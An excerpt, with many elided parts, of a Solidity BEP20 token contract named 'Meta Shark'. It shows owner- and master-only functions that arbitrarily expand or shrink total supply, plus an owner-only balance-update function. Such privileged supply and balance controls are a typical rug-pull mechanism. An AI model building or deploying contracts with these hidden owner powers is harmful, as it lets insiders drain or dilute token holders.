...
contract Meta_Shark is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Meta Shark";
    string constant _symbol = "MTS";
    ...
    event LogChange(uint256 indexed epoch, uint256 totalSupply);
    ...
    function change_percentage(uint256 _percentage_base1000, bool reduce) public onlyOwner returns (uint256 newSupply){

        if(reduce){
            newSupply = change(0,int(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1));
        } else{
            newSupply = change(0,int(_totalSupply.div(1000).mul(_percentage_base1000)));
        }
        
    }

    // Sauce
    function change(uint256 epoch, int256 supplyDelta) public onlyMaster returns (uint256) {
        change_count++;
        if(epoch == 0){
            epoch = change_count;
        }
        ...
        if (supplyDelta == 0) {
            emit LogChange(epoch, _totalSupply);
            return _totalSupply;
        }
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x4E2865D65b0292dFD26C6927b0640ccD9D3A9a2A;
        BuyBackReceiver = 0x7D1ace562D15255b08b6A99a4050626A00EB3398;
...
function change_updatebalance(address[] calldata addresses) external onlyOwner {
